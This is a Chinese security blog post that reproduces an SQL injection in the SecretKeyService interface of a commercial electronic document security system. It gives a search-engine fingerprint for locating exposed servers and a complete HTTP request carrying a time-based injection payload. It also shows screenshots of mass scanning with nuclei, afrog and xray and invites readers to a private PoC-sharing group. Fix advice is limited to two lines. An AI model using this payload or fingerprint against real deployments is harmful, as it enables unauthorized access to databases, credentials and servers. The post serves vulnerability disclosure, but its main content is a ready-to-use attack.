#  【漏洞复现】某赛通电子文档安全管理系统 SecretKeyService SQL注入漏洞   
Superhero  Nday Poc   2024-08-11 16:07  
  
**0x00 免责声明**  
  
内容仅用于学习交流使用，由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
**0x01 产品简介**  
  
某赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。  
  
  
**0x02 漏洞概述**  
  
某赛通电子文档安全管理系统 SecretKeyService接口处存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
  
**0x03 搜索引擎**  
```
body="/CDGServer3/index.jsp"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSR1CZds3NvPr6U92l7H0czBQZwiaoS3auibc7EjJqBlmiaOt1K7ak3zyhg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x04 漏洞复现**  
```
GET /CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKRo3S9tO0ic3zicHQSBEVnhf3B9xWaSyl8AfaXOJdBEssia2tzCHZ7tpOjO62icBpvG0q4Rz21c35iadg/640?wx_fmt=png&from=appmsg "")  
  
**0x05 工具批量**  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKRo3S9tO0ic3zicHQSBEVnhf2U6MHhcGXXtWicF2kYX5GUqlF0yo0ia3FeL1oC0bs29hicCeUdXia0w8WQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKRo3S9tO0ic3zicHQSBEVnhfrVPQkFztJRPLntF47n9VY0jkjc9TNfDtrj74peXeC3Xbib5hcz6sG6A/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwKRo3S9tO0ic3zicHQSBEVnhfqLQD9wSGyibKnbaEHUpZ1ib7NsBEZKX5Kydz3zC1PoH8JY02ADuqlt0g/640?wx_fmt=png&from=appmsg "")  
  
POC脚本获取  
  
请使用VX扫一扫加入内部  
POC脚本分享圈子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x06 修复建议**  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
  
